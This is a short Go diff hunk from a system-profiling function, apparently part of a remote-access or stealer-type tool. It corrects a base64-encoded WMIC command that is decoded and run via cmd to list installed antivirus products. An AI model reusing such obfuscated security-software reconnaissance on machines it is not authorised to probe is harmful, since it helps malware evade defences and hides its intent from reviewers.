@@ -24,7 +24,7 @@ func Sysguide() (string, string, string, string){
 
   	Username[(len(Username)-1)] = ' '
 
-  	var GetAV string = "V01JQyAvTm9kZTpsb2NhbGhvc3QgL05hbWVzcGFjZTpcXFxccm9vdFxcU2VjdXJpdHlDZW50ZXIyIFBhdGggQW50aVZpcnVzUHJvZHVjdCBHZXQgZGlzcGxheU5hbWUgL0Zvcm1hdDpMaXN0"
+  	var GetAV string = "V01JQyAvTm9kZTpsb2NhbGhvc3QgL05hbWVzcGFjZTpcXHJvb3RcU2VjdXJpdHlDZW50ZXIyIFBhdGggQW50aVZpcnVzUHJvZHVjdCBHZXQgZGlzcGxheU5hbWUgL0Zvcm1hdDpMaXN0"
     GetAvDecoded, _ := base64.StdEncoding.DecodeString(GetAV)
 
   	AV_Check := exec.Command("cmd", "/C", string(GetAvDecoded))
